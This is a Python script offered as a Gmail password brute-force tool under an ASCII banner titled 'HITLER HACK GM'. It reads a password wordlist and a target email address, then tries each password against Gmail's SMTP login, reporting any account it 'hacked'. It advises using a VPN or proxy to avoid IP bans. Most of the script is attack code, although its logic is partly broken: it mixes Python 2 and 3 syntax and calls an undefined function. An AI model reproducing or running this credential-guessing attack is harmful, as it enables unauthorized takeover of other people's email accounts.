
b = "\033[0;91m"

import os 
os.system("clear")
print (b+ "                              __      ----_       ")
print (" ___----             ___------              \     ")
print ("   ----________        ----                 \     ")
print ("               -----__    |             _____)    ")
print ("                    __-                /     \    ")
print ("        _______-----    ___--          \    /)\   ")
print (" ------_______      ---____            \__/  /    ")
print ("              -----__    \ --    _          /\    ")
print ("                     --__--__     \_____/   \_/\  ")
print ("                             ----|   /          | ")
print ("                                 |  |___________| ")
print ("                                 |  | ((_(_)| )_) ")
print ("                                 |  | ((_(_)| )_) ")
print ("                                 |  | ((_(_)| )_) ")
print ("                                 |  | ((_(_)| )_) ")
print ("                                 |  | ((_(_)| )_) ")
print ("                                 |  \_((_(_)|/(_) ")
print ("                                  \_____________) ")
print ("                                  \_____________)                                                                ") 
print (" _   _   _   _____   _       _____   _____         _   _       ___   _____   _   _         _____       ___  ___ ") 
print ("| | | | | | |_   _| | |     | ____| |  _  \       | | | |     /   | /  ___| | | / /       /  ___|     /   |/   | ")
print ("| |_| | | |   | |   | |     | |__   | |_| |       | |_| |    / /| | | |     | |/ /        | |        / /|   /| | ")
print ("|  _  | | |   | |   | |     |  __|  |  _  /       |  _  |   / / | | | |     | |\ \        | |  _    / / |__/ | | ")
print ("| | | | | |   | |   | |___  | |___  | | \ \       | | | |  / /  | | | |___  | | \ \       | |_| |  / /       | | ")
print ("|_| |_| |_|   |_|   |_____| |_____| |_|  \_\      |_| |_| /_/   |_| \_____| |_|  \_\      \_____/ /_/        |_| ")
import time
time.sleep(2)
print ("")
print ("  ^_^ THIS TOOL HAS BEEN PROGRAMED BE MENA MAGDY TO ECICAL HACKERS & PENTRATOIN ON YOUR GMAIL PASS  ^_^ ")
print ("")
print ("                           THIS TOOL HAS PAWORED BT PYTHON ONLYY ")
print ("                   ====================================================")
print ("                               VIP THINGS FOR THIS TOOL                 ")
print ("                   ==================================================== ")
print ("                       THIS TOOL HAS BEEN PROGRAMED BY MENA MAGDY       ")
print ("                             TO PENTRATION UR FACE STRPASS              ")
print ("                          WAS PROGARMED WITH PYTHON LNG ONLYYYY         ")
import time
time.sleep(1)
print ("                    ================================================  ")
print ("                          BY MENA MAGDY POWERD BY M3LOMAT THE PHONE   ")
print ("                              https://youtu.be/iTaZJtXLeaE            ")
print ("                    ================================================  ")
print ("")
from time import sleep
time.sleep(1)
print ("           MY WEBSITE TO DISCRIBE THIS TOOL www.m3lomatthephone.blogspot.com")
import time
time.sleep(1)
print("")
print ("enjoyy  ^_^ ")
print ("WARMING  =====>   USE VPN OR PROXY TO DON'T GET BAN IP")
############################################### start prigramin ##########################################################

import smtplib
from os import system


#print ("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
#print ("\\\\\\\\\\\HITLER-HACK-GM \\\\\\\\\")
#print ("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")

print ('[1] start the brute force attack')
print ('[2] exit')
option = input('==>')
if option == 1:
   file_path = raw_input('enter the path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] this account has been hacked, password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
